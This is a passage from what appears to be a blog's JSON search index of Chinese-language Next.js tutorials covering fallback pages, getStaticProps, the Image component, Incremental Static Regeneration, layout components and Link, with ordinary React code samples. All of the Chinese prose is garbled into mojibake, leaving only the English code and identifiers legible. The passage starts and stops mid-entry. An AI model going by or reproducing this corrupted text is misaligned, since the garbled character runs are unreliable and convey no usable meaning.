é–‹å§‹å‹•æ…‹ç”¢ç”Ÿæ–°çš„å…§å®¹ï¼ˆgetStaticPropsï¼‰ï¼Œä¸¦é€²å…¥ fallback loading çš„ç‹€æ…‹ï¼ˆæˆ–ç¨±ç‚º fallback é é¢ï¼‰ï¼Œé€™å€‹ç‹€æ…‹å¯ä»¥é€é router.isFallback ä¾†å–å¾—ã€‚ HTML ç”Ÿæˆå®Œä»¥å¾ŒæŠŠçµæœç§€å‡ºä¾† ä¸‹æ¬¡é€ è¨ªç›¸åŒé é¢æ™‚ï¼Œä¸éœ€è¦å†é‡æ–°ç”¢ç”Ÿä¸€æ¬¡ fallback: block é€™å€‹å°±è·Ÿ true æµç¨‹å·®ä¸å¤šï¼Œå”¯ä¸€çš„å·®åˆ¥æ˜¯æ²’æœ‰ router.isFallback å¯ä»¥å­˜å–ï¼Œç­‰æ–¼èªªåœ¨å‹•æ…‹ç”¢ç”Ÿçš„é€™æ®µæœŸé–“æ˜¯ã€Œå¡ä½ï¼ˆblockingï¼‰ã€çš„ï¼Œä¸æœƒæœ‰ fallback é é¢å­˜åœ¨ã€‚ä¹Ÿè¨±æ˜¯å› ç‚ºé€™æ¨£æ‰€ä»¥æ‰æœƒé€™æ¨£å‘½åå§ï¼Œä¸éåŸºæœ¬ä¸Šæœ€å¾Œçš„çµæœæœƒæ˜¯ç›¸åŒçš„ã€‚","link":"/2022/09/12/next-dynamic-route/"},{"title":"Next.jsï¼fallback","text":"ç¨å¾®è¤‡é›œä¸€äº›çš„æ©Ÿåˆ¶ã€‚ ç°¡è¿°å†è§£é‡‹ä¹‹å‰å…ˆèªªä¸€ä¸‹ä»€éº¼æ™‚å€™æœƒç”¨åˆ° Fallbackï¼Ÿèˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æˆ‘å€‘æœ‰ä¸€å€‹é€™æ¨£çš„ç¶²é ï¼š é¦–é æ˜¯ä¸€å€‹é£Ÿè­œåˆ—è¡¨ï¼Œæ¥è‘—é»é€²å»ä»¥å¾Œå¯ä»¥çœ‹åˆ°è©³ç´°å…§å®¹ï¼Œéå¸¸çš„ç°¡å–®ï¼Œè€Œé€™äº›è³‡æ–™éƒ½æ˜¯ä¸²æ¥ CMS ä¾†ç”¢ç”Ÿå‡ºçš„éœæ…‹è³‡æ–™ï¼ˆSSGï¼‰ã€‚ é‚£éº¼ç¾åœ¨æ€è€ƒä¸€å€‹å•é¡Œï¼š å‡è¨­æˆ‘åœ¨ CMS ä¸ŠåŠ äº†ä¸€å€‹æ–°é£Ÿè­œï¼Œé‚£æˆ‘è©²æ€éº¼åŒæ­¥åˆ°ç¶²é ä¸Šï¼Ÿ é€™é‚Šæœƒç¢°åˆ°çš„å•é¡Œæ˜¯ã€Œè©³ç´°é é¢ã€çš„å…§å®¹æ˜¯é€éç¶²å€ä¸Šçš„ slug ä¾†æŠ“å–çš„ï¼Œæ‰€ä»¥æœƒéœ€è¦ï¼š ç”¢ç”Ÿæ–°çš„é é¢ï¼ˆrecipes/peanu-butter-cookie.htmlï¼‰ æŠŠå°æ‡‰çš„è³‡æ–™æŠ“å–ä¸‹ä¾† æ‰€ä»¥é€™éƒ¨åˆ†çš„ code æœƒå¤§æ¦‚é•·é€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930// ç”¢ç”Ÿè·¯å¾‘export async function getStaticPaths() { const response = await client.getEntries({ content_type: 'recipe' }) const paths = response.items.map((recipes) =&gt; ({ params: { slug: recipes.fields.slug } })) return { paths, fallback: false }}// æ ¹æ“šè·¯å¾‘æŠ“è³‡æ–™ï¼Œæœ€å¾Œå†æ³¨å…¥ propsexport async function getStaticProps({ params }) { const response = await client.getEntries({ content_type: 'recipe', 'fields.slug': params.slug }) return { props: { recipe: response.items[0] }, revalidate: 1 }} é€™é‚Šé›–ç„¶æœ‰åˆ©ç”¨ã€ŒIncremental Static Regenerationã€ä¾†åšè‡ªå‹•æ›´æ–°å…§å®¹ï¼Œä½†ä¹‹å‰æœ‰èªªéä»–åªèƒ½å¹«ä½ æ›´æ–°ç¾æœ‰çš„é é¢ï¼Œæ²’è¾¦æ³•å¹«ä½ ç”¢ç”Ÿæ–°çš„ pageã€‚ æ‰€ä»¥å‡è¨­æˆ‘ç¾åœ¨æ–°å¢äº†ä¸€å€‹å«ã€Œabcã€çš„é£Ÿè­œï¼Œæ¥è‘—é€ è¨ªçš„è©±åªæœƒå¾—åˆ° 404 çš„çµæœï¼Œå› ç‚ºé€™æ˜¯ä¸€å€‹å…¨æ–°çš„ pageï¼ˆrecipes/abc.htmlï¼‰ï¼Œè€Œ Incremental Static Regeneration ä¸æœƒå¹«æˆ‘ç”¢ç”Ÿæ–°çš„ pageã€‚ æ‰€ä»¥è¦æ›´æ–°çš„è©±å°±æ˜¯æŠŠæ•´å€‹å°ˆæ¡ˆé‡æ–° build ä»¥å¾Œåœ¨é‡æ–° deploy ä¸€æ¬¡ã€‚å› ç‚ºæ˜¯é‡æ–°ç”¢ç”Ÿæ‰€æœ‰è³‡æ–™ï¼Œå› æ­¤å…§å®¹å°±æœƒæ›´æ–°ã€‚ é€™æ¨£ç¢ºå¯¦æ˜¯ä¸€ç¨®æ–¹å¼ã€‚ä½†æœ‰æ²’æœ‰æ›´å¥½çš„ä½œæ³•ï¼Ÿåƒæ˜¯è‡ªå‹•å¹«æˆ‘æŠ“å–æ–°è³‡æ–™ï¼Œæ¥è‘—ç”¢ç”Ÿå°æ‡‰çš„é é¢ï¼Ÿ æœ‰ï¼Œå°±æ˜¯æœ¬ç¯‡çš„æ¨™é¡Œ fallbackï¼Œä»–å°±æ˜¯ç”¨ä¾†åšé€™ä»¶äº‹çš„ã€‚ ä½¿ç”¨ Fallbackçœ¼å°–çš„è©±æ‡‰è©²èƒ½æ³¨æ„åˆ°å‰›å‰›çš„ç¯„ä¾‹ä¸­å…¶å¯¦å°±æœ‰å‡ºç¾ fallbackï¼Œä¸éå€¼æ˜¯ falseï¼š 123456789101112131415// ç”¢ç”Ÿè·¯å¾‘export async function getStaticPaths() { const response = await client.getEntries({ content_type: 'recipe' }) const paths = response.items.map((recipes) =&gt; ({ params: { slug: recipes.fields.slug } })) return { paths, fallback: false // åœ¨é€™è£¡ }} è¨­ç‚º false çš„è¡Œç‚ºå°±æ˜¯è·³è½‰åˆ° 404 é é¢ï¼Œæ„æ€æ˜¯ç•¶æˆ‘å€‘é€ è¨ªä¸å­˜åœ¨çš„é é¢ï¼ˆä¾‹å¦‚ï¼šrecipe/abcï¼‰æ™‚ï¼Œå› ç‚ºæ‰¾ä¸åˆ°å°æ‡‰é é¢æ‰€ä»¥å°±ç›´æ¥å°å‘ 404 é é¢ã€‚ é‡é»ä¾†äº†ï¼Œç¾åœ¨æˆ‘å€‘å¸Œæœ›ä»–èƒ½ã€Œè‡ªå‹•æŠ“å–æ–°è³‡æ–™ &amp; ç”¢ç”Ÿé é¢ã€çš„åŠŸèƒ½ï¼Œå› æ­¤è¦æŠŠä»–è¨­ç‚º trueã€‚ è¨­ç‚º true çš„è©±ç•¶æˆ‘å€‘åœ¨é€ è¨ª recipe/abc æ™‚ï¼Œä»–æœƒåšä¸‹é¢å¹¾ä»¶äº‹ï¼š é€²å…¥ Fallback Pageï¼ˆé€šå¸¸æœƒåšä¸€å€‹ Loading æ•ˆæœï¼‰ é‡æ–°åŸ·è¡Œ getStaticPropsï¼ŒæŠ“å– abc çš„é£Ÿè­œè³‡æ–™ æŠŠå›å‚³çµæœå‚³å…¥ propsï¼ŒæŠŠ recipes/abc çš„é é¢æ¸²æŸ“å‡ºä¾†çµ¦ä½¿ç”¨è€… è‡ªå‹•åœ¨ Server ç”¢ç”Ÿæ–°çš„ recipes/abc.htmlï¼Œä¸‹æ¬¡å°±ä¸éœ€è¦åœ¨è·‘é€™å€‹æµç¨‹ é™„è¨»ï¼šå¦‚æœåœ¨ç¬¬ä¸‰æ­¥æŠ“è³‡æ–™é€™ä¸€æ®µå‡ºå•é¡Œçš„è©±ï¼Œå¯ä»¥åšé‡æ–°å°å‘çš„å‹•ä½œã€‚ æ‰€ä»¥æˆ‘å€‘åªè¦é€™æ¨£å­æ”¹å¯«å°±å¥½ï¼š 123456789101112131415161718192021222324252627282930313233343536373839export async function getStaticPaths() { // ...ç•¥ return { paths, fallback: true // æ‰“é–‹ fallback åŠŸèƒ½ }}export async function getStaticProps({ params }) { const response = await getData() // å¦‚æœæŠ“è³‡æ–™å‡ºå•é¡Œçš„è©±ï¼Œç›´æ¥å°å‘é¦–é  if (!response.items.length) { return { redirect: { destination: '/', permanent: false } } } return { props: { recipe: response.items[0] }, revalidate: 1 }}export default function RecipeDetails({ recipe }) { // é€²å…¥ fallback é é¢ if (!recipe) { return &lt;Skeleton /&gt; } const { title, cookingTime, featureImage, ingredients, method } = recipe.fields return &lt;div&gt;{/*...*/}&lt;/div&gt;} é€™æ¨£å­å°±å®Œæˆå•¦ï¼Œæˆ‘è¦ºå¾—é‚„è »åˆ’ç®—çš„ï¼Œåªéœ€è¦ç°¡å–®åŠ å€‹å¹¾è¡Œå°±èƒ½å¯¦ç¾ã€‚","link":"/2022/09/15/next-fallback/"},{"title":"Next.jsï¼ç²å–è³‡æ–™ï¼ˆgetStaticPropsï¼‰","text":"å¾ˆé‡è¦å¾ˆé‡è¦çš„æ±è¥¿ã€‚ ç°¡è¿°ä¸€å€‹ç¶²ç«™é€šå¸¸éƒ½æœƒæœ‰ã€ŒæŠ“è³‡æ–™ã€é€™å€‹æµç¨‹ï¼Œåœ¨ React çš„ä¸–ç•Œè£¡æˆ‘å€‘é€šå¸¸æœƒç”¨ useEffect çš„æ–¹å¼ä¾†åšï¼š 12345678910111213141516171819202122export default function Index() { const [data, setData] = useState([]) useEffect(() =&gt; { fetch('https://jsonplaceholder.typicode.com/users') .then((response) =&gt; response.json()) .then((data) =&gt; setData(data)) }, []) return ( &lt;div&gt; &lt;h1&gt;All Ninjas&lt;/h1&gt; {data.map((item) =&gt; ( &lt;div key={item.id}&gt; &lt;a className={styles.single}&gt; &lt;h2&gt;{item.name}&lt;/h2&gt; &lt;/a&gt; &lt;/div&gt; ))} &lt;/div&gt; )} é€™æ¨£å­åšé›–ç„¶å¥½åƒå¯è¡Œï¼Œä½†è¦æ³¨æ„é€™æ¨£å°±è®Šæˆ CSR è€Œä¸æ˜¯ SSR äº†ï¼Œæ›å¥è©±èªªå°±æ˜¯å¤±å»åŸæœ¬çš„æ„ç¾©äº†ï¼Œå› ç‚ºæ‰“é–‹åŸå§‹ç¢¼ä½ é‚„æ˜¯æœƒçœ‹åˆ°ã€Œç©ºè•©è•©çš„å…§å®¹ã€ï¼Œè€Œä¸æ˜¯è¢«æ¸²æŸ“å¾Œçš„çµæœã€‚ æ‰€ä»¥è¦è®“ã€ŒæŠ“è³‡æ–™ã€é€™ä»¶äº‹åœ¨ Server ç«¯å°±å®Œæˆä¸¦ä¸”æ¸²æŸ“çš„è©±ï¼Œè¦æ”¹ç”¨ Next æä¾›çš„ getStaticPropsï¼Œé€™æ˜¯å…¶ä¸­ä¸€ç¨®ï¼Œé‚„æœ‰å¦å¤–ä¸€ç¨®æ–¹å¼å«åš getServerSidePropsï¼Œè©³ç´°å¯ä»¥åƒè€ƒé€™ç¯‡æ–‡ç« ã€‚ 1234567891011121314151617181920212223242526// export ä¸€å€‹ getStaticProps çµ¦ Next åšè™•ç†ï¼ˆå¿…é ˆæ˜¯ async å‡½å¼ï¼‰export const getStaticProps = async () =&gt; { const response = await fetch('https://jsonplaceholder.typicode.com/users') const ninjas = await response.json() return { props: { ninjas } }}export default function Index(props) { return ( &lt;div&gt; &lt;h1&gt;All Ninjas&lt;/h1&gt; {props.ninjas.map((ninja) =&gt; ( &lt;div key={ninja.id}&gt; &lt;a className={styles.single}&gt; &lt;h2&gt;{ninja.name}&lt;/h2&gt; &lt;/a&gt; &lt;/div&gt; ))} &lt;/div&gt; )} èƒŒå¾Œçš„åŸç†å…¶å¯¦å°±æ˜¯å‘Šè¨´ Next åœ¨åš pre-rendering æ™‚å…ˆå»åŸ·è¡Œ getStaticPropsï¼Œæ¥è‘—åœ¨æŠŠå›å‚³å€¼ç•¶ä½œ props å‚³çµ¦å°æ‡‰çš„ page å…ƒä»¶ï¼Œå› æ­¤ page åªè¦æ ¹æ“š props ä¾†æ¸²æŸ“å‡ºå…§å®¹å°±è¡Œäº†ã€‚ é—œæ–¼ Pre-renderingï¼ˆSSG / SSRï¼‰å‰›å‰›çš„ç¯„ä¾‹ç”¨çš„æ˜¯ SSGï¼ˆStatic Side Generationï¼‰ï¼Œä¸éé™¤æ­¤ä¹‹å¤– Next é‚„æä¾›äº†å¦ä¸€ç¨®æ–¹æ³•æ˜¯ SSRï¼ˆServer Side Renderingï¼‰ï¼Œé€™å…©è€…çš„å…±é€šé»æ˜¯ã€ŒPre-renderingã€ï¼Œå°±æ˜¯ç•«é¢éƒ½æœƒåœ¨ Server ç«¯å…ˆæ¸²æŸ“å®Œæˆã€‚ ä¸»è¦çš„å·®åˆ¥åœ¨æ–¼ Pre-rendering çš„ã€Œæ™‚æ©Ÿé»ã€ï¼ŒSSG æ˜¯åœ¨ build æ™‚ç”¢ç”Ÿï¼ŒSSR å‰‡æ˜¯åœ¨æ”¶åˆ° request æ™‚ç”¢ç”Ÿï¼Œåƒè€ƒé€™å¼µåœ–ï¼š é™„è¨»ï¼šå¦‚æœç”¨ PHP é‚è¼¯ä¾†è§£é‡‹çš„è©± SSG å°±åƒæ˜¯ä¸€é–‹å§‹å°±å…ˆæŠŠç·¨è­¯å¾Œçš„çµæœå­˜èµ·ä¾†ï¼Œç­‰æœ‰ request æ™‚å†ç›´æ¥é€å‡ºå»ï¼›è€Œ SSR å‰‡æ˜¯æ”¶åˆ° request æ™‚æ‰åšç·¨è­¯ã€‚ è‡³æ–¼å“ªä¸€ç¨®æ–¹å¼æ¯”è¼ƒå¥½é‚„æ˜¯è¦çœ‹æƒ…æ³ï¼ŒSSG æ¯”è¼ƒé©åˆç”¨åœ¨å…§å®¹ä¸å¤ªæœƒè®Šå‹•çš„ï¼ˆç•¢ç«Ÿéƒ½å« Static äº†ï¼‰ï¼Œè€Œ SSR å‰‡é©åˆç”¨åœ¨å…§å®¹æœƒå¸¸å¸¸æ›´æ–°çš„å…§å®¹ï¼ˆéœ€è¦ Server é »ç¹çš„ç”¢ç”Ÿæ–°çš„ HTMLï¼‰ï¼Œç¸½ä¹‹è¦è¦–æƒ…å¢ƒä¾†é¸æ“‡ã€‚","link":"/2022/09/10/next-get-static-props/"},{"title":"Next.jsï¼ä½¿ç”¨åœ–ç‰‡","text":"è—äº†è »å¤šå°ç´°ç¯€ã€‚ ç°¡è¿°å¾ˆç°¡å–®ï¼Œåªè¦æŠŠå°æ‡‰çš„åœ–ç‰‡ä¸Ÿåˆ° /public åº•ä¸‹å¾Œåœ¨å­˜å–å°±è¡Œäº†ï¼š 1234567891011121314151617181920import Link from 'next/link'export default function Navbar() { return ( &lt;nav&gt; &lt;h1 className='logo'&gt; &lt;img src='/logo.png' /&gt; &lt;/h1&gt; &lt;Link href='/'&gt; &lt;a&gt;Home&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/about'&gt; &lt;a&gt;About&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/ninjas'&gt; &lt;a&gt;Ninja Listing&lt;/a&gt; &lt;/Link&gt; &lt;/nav&gt; )} ä¸éæ¯”èµ·ç”¨ &lt;img&gt; Next æœƒæ›´æ¨è–¦ä½ ç”¨å…§å»ºçš„ &lt;Image&gt; å…ƒä»¶ä¾†è™•ç†ï¼š 123456789101112131415161718192021import Image from 'next/image'import Link from 'next/link'export default function Navbar() { return ( &lt;nav&gt; &lt;h1 className='logo'&gt; &lt;Image src='/logo.png' alt='ninjas' width={128} height={77} /&gt; &lt;/h1&gt; &lt;Link href='/'&gt; &lt;a&gt;Home&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/about'&gt; &lt;a&gt;About&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/ninjas'&gt; &lt;a&gt;Ninja Listing&lt;/a&gt; &lt;/Link&gt; &lt;/nav&gt; )} è¦æ³¨æ„ä½¿ç”¨ &lt;Image&gt; ä¸€å®šè¦æä¾›å¯¬è·Ÿé«˜ï¼Œnext æœƒè‡ªå‹•å¹«ä½ è™•ç† RWD çš„å•é¡Œï¼Œé™¤æ­¤ä»¥å¤–é‚„æœƒè‡ªå‹•å¹«ä½ åšã€ŒLazy Loadingã€çš„åŠŸèƒ½ï¼Œç®—æ˜¯ä¸€å€‹å¾ˆæ£’çš„åŠŸèƒ½ã€‚ è¼‰å…¥å¤–éƒ¨åœ–ç‰‡ç•¶ä½ é€éã€Œç¶²å€ã€ä¾†å¼•å…¥å¤–éƒ¨åœ–ç‰‡æ™‚ï¼Œå¯èƒ½æœƒçœ‹åˆ°é€™å€‹éŒ¯èª¤è¨Šæ¯ï¼š ç°¡å–®ä¾†èªªé€™æ˜¯ Next ç‚ºäº†é¿å… XSS æ”»æ“Šè€Œä½¿ç”¨çš„ä¸€ç¨®æªæ–½ï¼Œä½ å¿…é ˆåˆ—å‡ºä¸€ä»½ã€Œç™½åå–®ã€ä¾†å‘Šè¨´ Nextã€Œæˆ‘ä¿¡ä»»å“ªäº› Domain ä¸‹çš„è³‡æºï¼Ÿã€ æ‰€ä»¥è¦åŠ ä¸Šé€™æ®µ config è¨­å®šï¼š 123456// next.config.jsmodule.exports = { images: { domains: ['assets.example.com'] }} æ›´å¤šè©³ç´°å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶çš„èªªæ˜ã€‚ layoutï¼ˆpropsï¼‰åœ¨ Image ä¸­æœ‰ä¸€å€‹ layout props å¯ä»¥ç”¨ä¾†èª¿æ•´åœ–ç‰‡çš„å°ºå¯¸ï¼Œè©³ç´°å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼Œé€™é‚Šç°¡å–®èªªæ˜ä¸€ä¸‹ç”¨é€”ã€‚ é è¨­å€¼æ˜¯intrinsicï¼Œå°±æ˜¯ä¾ç…§ width å’Œ height çš„å°ºå¯¸ä¾†è¨­ç½®åœ–ç‰‡ï¼Œä¸éåœ¨åš RWD çš„æ™‚å€™å°±æœƒç¢°åˆ°é€™å€‹å•é¡Œï¼š é€™é‚Šåœ–ç‰‡çš„ width å’Œ height çš„å€¼è¨­ç‚º 200ï¼Œæ‰€ä»¥ä»–å°±åªæœƒæ˜¯é€™å€‹å°ºå¯¸ï¼Œä¸æœƒéš¨è‘—å®¹å™¨ä¾†åšç¸®æ”¾ã€‚ é€™æ™‚å€™å°±å¯ä»¥æ”¹æˆ responsiveï¼Œè®“ä»–è‡ªå‹•å¡«æ»¿å®¹å™¨çš„å¯¬ï¼Œé”åˆ° RWD çš„æ•ˆæœï¼š æˆ‘è¦ºå¾—é€™æ‡‰è©²æ˜¯æœƒå¾ˆå¸¸ç”¨çš„ä¸€å€‹å€¼ï¼Œæ‰€ä»¥å¯ä»¥è¨˜èµ·ä¾†ã€‚è‡³æ–¼å…¶ä»–çš„é¸é …å¯ä»¥åˆ°æˆ‘å¯«çš„ ç¯„ä¾‹ è‡ªå·±ç©ç©çœ‹ã€‚","link":"/2022/09/06/next-image/"},{"title":"Next.jsï¼Incremental Static Regeneration","text":"åœ¨å­¸ Next çš„äººéƒ½ä¸€å®šæœƒå­¸åˆ°å®ƒã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªé€™æ˜¯ä¸€å€‹ Next æä¾›ä¸€ç¨®ã€Œè®“ä½ èƒ½å¤ å‹•æ…‹æ›´æ–°å…§å®¹ã€çš„åŠŸèƒ½ã€‚é€™è£¡å…ˆå¼·çƒˆæ¨è–¦é€™éƒ¨å½±ç‰‡ï¼Œçœ‹å®Œä½ å¤§æ¦‚å°±ç†è§£ç‚ºä»€éº¼éœ€è¦é€™å€‹åŠŸèƒ½äº†ã€‚ èˆ‰å€‹ä¾‹å­ï¼Œä¸€èˆ¬ä¾†èªªæˆ‘å€‘ç”¨ SSG æ‰“åŒ…å¾Œéƒ¨ç½²å¾Œçš„ç¶²ç«™ï¼Œåªè¦æˆ‘å€‘æ²’æœ‰é‡æ–°åšã€Œbuild ã€é€™å€‹å‹•ä½œçš„è©±ï¼Œå…§å®¹å°±æœƒç¶­æŒåœ¨ã€Œä¸Šä¸€æ¬¡ build å‡ºä¾†çš„å…§å®¹ã€ã€‚æ‡‰è©²å¾ˆåˆç†å§ï¼Ÿç•¢ç«Ÿ SSG çš„æœ¬è³ªå°±åªæ˜¯åœ¨ build æ™‚ç”¢ç”Ÿå…§å®¹ï¼Œæ¥è‘—å†æ”¾åˆ° Server ä¸Šè€Œå·²ã€‚ å¯æ˜¯é€™æ¨£åšæœ‰ä¸€å€‹å•é¡Œï¼Œæœ‰æ™‚å€™æˆ‘å€‘å¯èƒ½åªæ˜¯æ”¹å‹•ä¸€å€‹å°åœ°æ–¹è€Œå·²ï¼Œå°±è¦é‡æ–°åš build &amp; deploy ä¼¼ä¹æœ‰é»å¤ªé‡å·¥äº†ï¼Œå°¤å…¶æ˜¯ç•¶å°ˆæ¡ˆå¾ˆå¤§çš„æ™‚å€™å¯èƒ½åˆæœƒèŠ±è²»æ›´å¤šæ™‚é–“ä¾†è™•ç†ã€‚ å› æ­¤ Incremental Static Regeneration å°±æ˜¯ç”¨ä¾†è§£æ±ºé€™ä»¶äº‹çš„ï¼Œä»–æœƒåšä¸‹é¢é€™å¹¾ä»¶äº‹ï¼š å¹«ä½ æª¢æŸ¥ç›®å‰é€™å€‹é é¢çš„å…§å®¹æ˜¯å¦æœ‰æ›´æ–°ï¼Ÿ å¦‚æœæœ‰ï¼ŒNext æœƒåœ¨è‡ªå‹•åœ¨èƒŒå¾Œé‡æ–°æŠ“å–å…§å®¹ï¼ˆæ­£ç¢ºä¾†èªªæ˜¯é‡è·‘ä¸€æ¬¡ getStaticPropsï¼‰ã€‚ é‡æ–°æ•´ç†å¾Œ or ä¸‹å€‹é€²ä¾†äººï¼Œå°±èƒ½çœ‹åˆ°æ–°çš„å…§å®¹ é€™é‚Šè¦æ³¨æ„çš„åœ°æ–¹æ˜¯é‡æ–°æ•´ç†å¾Œæ‰æœƒçœ‹åˆ°æ›´æ–°å¾Œçš„å…§å®¹ï¼Œä¸¦ä¸æœƒå³æ™‚åæ‡‰åœ¨ç•«é¢ä¸Šã€‚ å¦å¤–ä¸€å€‹è¦æ³¨æ„çš„åœ°æ–¹æ˜¯åªæœƒæ›´æ–°ç›®å‰ç¾æœ‰çš„é é¢ï¼Œèˆ‰ä¾‹ä¾†èªªæˆ‘åŸæœ¬æœ‰é€™äº›é é¢ï¼š home.html about.html ä¸¦ä¸”é€™å…©å€‹é é¢éƒ½è¨­å®šäº† Incremental Static Regenerationï¼Œæ‰€ä»¥ç•¶é€™å…©å€‹é é¢çš„å…§å®¹æ”¹è®Šæ™‚å°±æœƒè¢«é‡æ–°ç”¢ç”Ÿï¼Œå¾ˆåˆç†ã€‚ Butï¼Œå¦‚æœç¾åœ¨æˆ‘æ–°å¢äº†ä¸€å€‹ contact.htmlï¼Œé‚£æˆ‘çš„ç¶²é ä¸Šæ˜¯ä¸æœƒå¤šå‡ºé€™å€‹é é¢çš„ï¼Œé€™å€‹ä¸åœ¨çš„ Incremental Static Regeneration ç¯„åœï¼Œä¸€å®šè¦ç­‰åˆ°æˆ‘æ•´å€‹å°ˆæ¡ˆé‡æ–° buildï¼Œæˆ–è€…æ˜¯åˆ©ç”¨ fallback é é¢ä¾†è™•è£¡æ‰æœƒæ›´æ–°ï¼Œé€™å€‹å°±ç•™åˆ°ä¸‹ä¸€ç¯‡å†ä¾†è§£é‡‹äº†ã€‚ ç¸½ä¹‹è¦ä¸€å®šææ¸…æ¥šã€Œæ›´æ–°çš„å¯¦éš›ç¯„åœã€æ˜¯å“ªè£¡ï¼Ÿé€™æ¨£å°±è¡Œäº†ã€‚ ä½¿ç”¨æ–¹å¼ä½¿ç”¨çš„æ–¹å¼å¾ˆç°¡å–®ï¼Œåªè¦åœ¨é‚£å€‹é é¢çš„ getStaticProps æ–°å¢ä¸€å€‹ revalidate å›å‚³å€¼å°±è¡Œäº†ï¼š 1234567891011121314export async function getStaticProps({ params }) { const response = await client.getEntries({ content_type: 'recipe', 'fields.slug': params.slug }) return { props: { recipe: response.items }, // æ¯ 10 ç§’æª¢æŸ¥ä¸€æ¬¡ revalidate: 10 }} è§£é‡‹ä¸€ä¸‹ revalidate çš„å«ç¾©ï¼Œé€™å€‹ã€Œæ¯ 10 ç§’æª¢æŸ¥ã€çš„æ„æ€æ˜¯ï¼š ç•¶æœ‰äººé€ è¨ªé€™å€‹é é¢ è€Œä¸”è·é›¢ä¸Šæ¬¡æ›´æ–°å·²ç¶“è¶…é 10 ç§’ æ‰æœƒè§¸ç™¼æª¢æŸ¥çš„å‹•ä½œï¼Œä¸¦ä¸æ˜¯åœ¨èƒŒå¾Œæ¯éš”åç§’å°±æª¢æŸ¥ä¸¦ä¸”æ›´æ–°çš„æ„æ€ã€‚","link":"/2022/09/14/next-incremental-static-regeneration/"},{"title":"Next.jsï¼å‡ºç¾åœ¨æ‰€æœ‰é é¢çš„å…ƒä»¶ï¼ˆLayoutï¼‰","text":"ç°¡ç¨±æ ¹å…ƒç´  ç°¡è¿°æœ‰äº›å…§å®¹é€šå¸¸æœƒå‡ºç¾åœ¨ã€Œæ¯ä¸€å€‹é é¢ã€ä¸­ï¼Œé€™æ™‚å€™è¦æ€éº¼è™•ç†æ¯”è¼ƒå¦¥ç•¶ï¼Ÿä½ ç¬¬ä¸€å€‹æœƒæƒ³åˆ°çš„å¯èƒ½æ˜¯å¯«æˆç¨ç«‹çš„ Componentã€‚ Butï¼Œå¦ä¸€å€‹å•é¡Œä¾†äº†ï¼Œå‡ä½¿æœ‰ 100 å€‹é é¢éƒ½æœƒç”¨åˆ°çš„è©±ï¼Œæ˜¯ä¸æ˜¯å°±å¾—åœ¨æ‰€æœ‰é é¢éƒ½æ’å…¥é€™å€‹ Componentï¼Œåƒé€™æ¨£ï¼š 1234567891011121314export default function About() { return ( &lt;div&gt; {/* æ’å…¥å¯«å¥½çš„ component */} &lt;Navbar /&gt; &lt;h1&gt;about&lt;/h1&gt; &lt;p&gt; Lorem, ipsum dolor sit amet consectetur adipisicing elit. Incidunt, ab culpa accusantium quo iure aperiam impedit ducimus eum sit earum illum, est fuga alias soluta suscipit tempore esse nulla dolorem! &lt;/p&gt; &lt;/div&gt; )} æ€è€ƒä¸€ä¸‹å¦‚æœå“ªå¤©æˆ‘æƒ³æŠŠ &lt;Navbar&gt; æ›ä½ç½®ï¼Ÿæˆ–è€…æ˜¯åˆæœ‰æ–°çš„ Component è¦æ·»åŠ çš„è©±ï¼Œæˆ‘æ˜¯ä¸æ˜¯å°±å¾—ä¸€å€‹ä¸€å€‹å»æ”¹æˆ–æ–°å¢ï¼Ÿé›–ç„¶æ˜¯å¯è¡Œï¼Œä½†æ˜¯å¤ªéº»ç…©äº†ï¼Œæ‰€ä»¥å…¶å¯¦æœ‰æ›´å¥½çš„ä½œæ³•ã€‚ é¦–å…ˆæ³¨æ„åˆ° pages/_app.js é€™éš»æª”æ¡ˆï¼š 1234567import '../styles/globals.css'function MyApp({ Component, pageProps }) { return &lt;Component {...pageProps} /&gt;}export default MyApp é€™æ”¯æª”æ¡ˆçš„å…§å®¹å…¶å¯¦å°±æ˜¯æ•´å€‹é é¢çš„ã€Œçµæ§‹ã€ï¼Œæ›å¥è©±èªªæ”¾åœ¨é€™è£¡çš„æ±è¥¿éƒ½æœƒè¢«ç•¶ä½œæ˜¯é é¢çš„ä¸€éƒ¨åˆ†ï¼Œæ¯”å¦‚èªªæˆ‘åŠ äº†ä¸€å€‹ã€Œæ¨™é¡Œã€ï¼š 123456789101112import '../styles/globals.css'function MyApp({ Component, pageProps }) { return ( &lt;div&gt; &lt;h1&gt;Global Title&lt;/h1&gt; &lt;Component {...pageProps} /&gt; &lt;/div&gt; )}export default MyApp é‚£ç¾åœ¨ä¸è«–æ˜¯å“ªå€‹é é¢éƒ½æœƒçœ‹åˆ° Global Title é€™æ®µæ–‡å­—ã€‚ æ‰€ä»¥å¸¸è¦‹çš„ &lt;Navbar&gt; æˆ–æ˜¯ &lt;Footer&gt; éƒ½å¯ä»¥æ”¾åœ¨é€™é‚Šã€‚ä¸éæ¯”èµ·ç›´æ¥æ”¾é€²å»ï¼Œæ›´å¥½çš„ä½œæ³•æ˜¯æŠ½æˆ Component æ­é… children ä¾†ä½¿ç”¨ï¼Œåƒé€™æ¨£ï¼š 1234567891011// components/Layout.jsimport Navbar from './Navbar'export default function Layout({ children }) { return ( &lt;div&gt; &lt;Navbar /&gt; {children} &lt;/div&gt; )} 123456789101112// _app.jsimport Layout from '../components/Layout'function MyApp({ Component, pageProps }) { return ( &lt;Layout&gt; &lt;Component {...pageProps} /&gt; &lt;/Layout&gt; )}export default MyApp æŠŠ children å¯«æˆ props çš„å½¢å¼å°±å¯ä»¥è®“ code çœ‹èµ·ä¾†æ›´ç°¡æ½”ä¸€äº›ï¼Œä¹Ÿå¯ä»¥æŠŠé‚è¼¯å°è£åœ¨å…ƒä»¶è‡ªèº«ä¸Šã€‚","link":"/2022/09/02/next-layout-component/"},{"title":"Next.jsï¼Link","text":"åˆä¾†å¸¶ä½ ç’°éŠä¸–ç•Œã€‚ ç°¡è¿°åœ¨ Next ä¸­è¦åšã€Œè·³è½‰ã€é€™å€‹å‹•ä½œä¸€æ¨£è¦é€éå®ƒæä¾›çš„ Link å…ƒä»¶ä¾†å¯¦ä½œï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617import Link from 'next/link'export default function Navbar() { return ( 